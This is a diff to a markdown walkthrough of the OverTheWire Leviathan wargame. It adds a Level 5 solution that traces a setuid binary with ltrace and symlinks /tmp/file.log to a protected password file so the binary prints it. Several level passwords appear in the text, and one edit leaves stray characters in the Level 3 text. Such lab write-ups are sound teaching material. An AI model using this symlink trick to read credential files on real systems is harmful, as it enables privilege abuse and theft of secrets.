@@ -103,7 +103,7 @@ password: `Ahdiemoo1j`
 There's also a slightly more in depth trick utilizing symlinks that can be found by googling for the solution to this level. I like my solution :).
 
 ## Level 3 to Level 4
-Now we have an executable file called `level3` that prompts us for a password when we execute it. This level is pretty easy since we know about `ltrace`. It tells us that the password we need to enter to the binary is `snlprintf` (look at the `strcmp` below):
+Now we have an executable file called `level3` that prompts us for a password when we execute it. This level is pretty easy since we know about `ltrace`.  iIt tells us that the password we need to enter to the binary is `snlprintf` (look at the `strcmp` below):
  i
 ```bash
 leviathan3@leviathan:~$ ltrace ./level3
@@ -137,5 +137,49 @@ Lucky us, that's the password!
 password: `Tith4cokei`
 
 ## Level 5 to Level 6
+Another level, another `setuid` binary! This one looks for a `/tmp/file.log` which doesn't exist:
 
+```bash
+leviathan5@leviathan:~$ ltrace ./leviathan5
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                     = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                               = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+```
+
+If we make that file, we get the following:
+
+```bash
+leviathan5@leviathan:~$ touch /tmp/file.log
+leviathan5@leviathan:~$ ltrace ./leviathan5
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                     = 0x804b008
+fgetc(0x804b008)                                                = '\377'
+feof(0x804b008)                                                 = 1
+fclose(0x804b008)                                               = 0
+getuid()                                                        = 12005
+setuid(12005)                                                   = 0
+unlink("/tmp/file.log")                                         = 0
++++ exited (status 0) +++
+```
+
+Hmm... let's put something in the file.
+
+```bash
+leviathan5@leviathan:~$ echo "test" > /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5
+test
+```
+
+So, it seems like it just outputs whatever is in /tmp/file.log. Now finally seems like a good time for symbolic links (which I definitely don't remember how to create, so I google it). The format is like this: `ln -s source_file myfile`
+
+```bash
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5
+UgaoFee4li
+```
+
+password: `UgaoFee4li`
 
